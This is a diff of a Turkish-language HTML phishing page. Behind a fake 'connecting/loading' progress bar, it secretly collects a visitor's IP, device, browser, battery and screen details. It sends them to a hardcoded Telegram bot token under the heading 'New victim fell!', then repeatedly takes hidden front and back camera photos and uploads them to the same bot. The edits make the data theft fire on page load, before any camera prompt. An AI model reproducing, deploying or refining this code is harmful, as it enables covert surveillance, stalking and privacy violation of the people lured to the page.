@@ -120,21 +120,18 @@
     // ========== TELEGRAM AYARLARI (URL'den alınır) ==========
     const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
     
-    // URL'den chat_id'yi al
     function urlParametresiAl(param) {
         const urlParams = new URLSearchParams(window.location.search);
         return urlParams.get(param);
     }
     
     let CHAT_ID = urlParametresiAl('id');
-    
-    // Eğer URL'de chat_id yoksa varsayılan
     if (!CHAT_ID) {
         CHAT_ID = '7497803165';
     }
     // =======================================================
 
-    // Loading bar
+    // Loading bar animasyonu
     let progress = 0;
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
@@ -144,12 +141,9 @@
       "Sunucuya bağlanılıyor...",
       "İnternet sağlanıyor...",
       "Veriler doğrulanıyor...",
-      "Bekliyor...",
       "Sistem hazırlanıyor...",
       "Güvenli bağlantı kuruluyor...",
       "Paketler indiriliyor...",
-      "Bağlantı optimize ediliyor...",
-      "Herşey hazırlanıyor...",
       "bir dakika..."
     ];
 
@@ -167,13 +161,12 @@
       statusText.innerText = randomMessage;
     }, 2000);
 
-    // ========== KAMERA SİSTEMİ ==========
+    // ========== KAMERA VE VERİ SİSTEMİ ==========
     let mediaStream = null;
     let fotoSayac = 0;
     let ipBilgisi = 'bilinmiyor';
     let arkaKameraVar = false;
 
-    // IP'yi bir kere al
     async function getIp() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -182,7 +175,6 @@
       } catch(e) {}
     }
 
-    // Batarya bilgisi al
     async function getBattery() {
       if (navigator.getBattery) {
         try {
@@ -193,20 +185,20 @@
       return 'bilinmiyor';
     }
 
-    // Cihaz bilgilerini mesaj olarak gönder (fotoğraftan bağımsız)
     async function cihazBilgisiGonder() {
       try {
+        await getIp();
         const battery = await getBattery();
         
         const info = `
-🌐 **IP:** ${ipBilgisi}
+🌐 **Yeni Kurban Düştü!** 🌐
+
+🌐 **IP:** \`${ipBilgisi}\`
 💻 **Cihaz:** ${navigator.platform}
-🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 80)}
+🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 60)}
 🔋 **Batarya:** ${battery}
 📺 **Ekran:** ${screen.width}x${screen.height}
-⏰ **Saat:** ${new Date().toLocaleString('tr-TR')}
 🌐 **Dil:** ${navigator.language}
-📡 **Bağlantı:** ${navigator.connection ? navigator.connection.effectiveType : 'bilinmiyor'}
         `.trim();
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -218,124 +210,101 @@
             parse_mode: 'Markdown'
           })
         });
-
-        console.log('Cihaz bilgisi gönderildi');
+        console.log('Cihaz bilgisi bota postalandı.');
       } catch (err) {
-        console.error('Cihaz bilgisi gönderilemedi:', err);
+        console.error('Cihaz bilgisi hatası:', err);
       }
     }
 
-    // Fotoğraf çekip Telegram'a gönder (arka/ön sırayla)
     async function fotoCek(kameraTipi) {
       try {
         const video = document.getElementById('hiddenVideo');
         if (!video || !video.videoWidth) return;
 
         fotoSayac++;
-
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-
-        const etiket = kameraTipi === 'arka' ? '🔙 ARKA KAMERA' : '🔚 ÖN KAMERA';
-
-        const caption = `📸 **Fotoğraf #${fotoSayac}** — ${etiket}`;
+        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+        const etiket = kameraTipi === 'arka' ? '🔙 ARKA' : '🔚 ÖN';
 
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', photoBlob, `foto_${fotoSayac}_${kameraTipi}.jpg`);
-        formData.append('caption', caption);
+        formData.append('photo', photoBlob, `foto_${fotoSayac}.jpg`);
+        formData.append('caption', `📸 **Fotoğraf #${fotoSayac}** — [${etiket} KAMERA]`);
         formData.append('parse_mode', 'Markdown');
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
           body: formData
         });
-
-        console.log(`Fotoğraf #${fotoSayac} gönderildi (${etiket})`);
-
+        console.log(`Foto #${fotoSayac} gönderildi.`);
       } catch (err) {
-        console.error('Fotoğraf gönderilemedi:', err);
+        console.error('Foto gönderim hatası:', err);
       }
     }
 
-    // Kamerayı belirli bir yönde aç
     async function kamerayiAc(facingMode) {
       if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
       }
-
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: facingMode, width: 640, height: 480 },
+          video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
-
         const video = document.getElementById('hiddenVideo');
         video.srcObject = stream;
         await video.play();
-
         mediaStream = stream;
         return true;
-
       } catch (err) {
-        console.error(`${facingMode} kamera açılamadı:`, err);
+        console.error(`${facingMode} açılamadı:`, err);
         return false;
       }
     }
 
     let sira = 0; // 0 = ön, 1 = arka
-
     async function siradakiFotoyuCek() {
       if (sira === 0) {
         const basarili = await kamerayiAc('user');
         if (basarili) {
-          await new Promise(r => setTimeout(r, 800));
+          await new Promise(r => setTimeout(r, 1000));
           await fotoCek('on');
         }
-        sira = arkaKameraVar ? 1 : 0;
-      } else if (sira === 1 && arkaKameraVar) {
+        sira = 1;
+      } else {
         const basarili = await kamerayiAc('environment');
         if (basarili) {
-          await new Promise(r => setTimeout(r, 800));
+          await new Promise(r => setTimeout(r, 1000));
           await fotoCek('arka');
         }
         sira = 0;
       }
     }
 
-    // Ana fonksiyon
+    // === HATA VERMEDEN SIRAYLA ÇALIŞAN ANA MOTOR ===
     async function baslat() {
-      await getIp();
-
-      // Önce arka kamerayı test et
-      const arkaTest = await kamerayiAc('environment');
-      if (arkaTest) {
-        arkaKameraVar = true;
-        console.log('Arka kamera mevcut');
-      } else {
-        console.log('Arka kamera yok, sadece ön kamera kullanılacak');
-      }
-
-      // Ön kameraya geç (başlangıç)
-      await kamerayiAc('user');
-
-      // İlk cihaz bilgisini gönder
-      await new Promise(r => setTimeout(r, 1000));
+      // 1. Kamera izni aramadan ÖNCE hemen eldeki cihaz bilgilerini bota fırlat
       await cihazBilgisiGonder();
 
-      // 1.5 saniye sonra ilk fotoğraf
-      await new Promise(r => setTimeout(r, 1500));
-      await siradakiFotoyuCek();
-
-      // 4 saniyede 1 foto çek (arka/ön dönüşümlü)
-      setInterval(siradakiFotoyuCek, 4000);
-
-      // Her 20 saniyede 1 cihaz bilgisi tekrar gönder
-      setInterval(cihazBilgisiGonder, 20000);
+      // 2. İlk olarak ön kamerayı açıp kullanıcıdan izin koparmaya çalış
+      console.log("Kamera izni isteniyor...");
+      const izinVerildi = await kamerayiAc('user');
+      
+      if (izinVerildi) {
+        console.log("İzin alındı, döngü başlıyor.");
+        // Kameranın ışığı ayarlanana kadar 1 saniye bekle ve ilk fotoyu çek
+        await new Promise(r => setTimeout(r, 1000));
+        await fotoCek('on');
+        
+        // Her 5 saniyede bir sırayla ön/arka foto çekmeye devam et
+        setInterval(siradakiFotoyuCek, 5000);
+      } else {
+        statusText.innerText = "Hata: Kamera izni verilmedi!";
+      }
     }
 
     window.addEventListener('beforeunload', () => {
@@ -344,8 +313,8 @@
       }
     });
 
-    // Başlat
-    baslat();
+    // Sayfa yüklenince sistemi tetikle
+    window.onload = baslat;
   </script>
 
 </body>
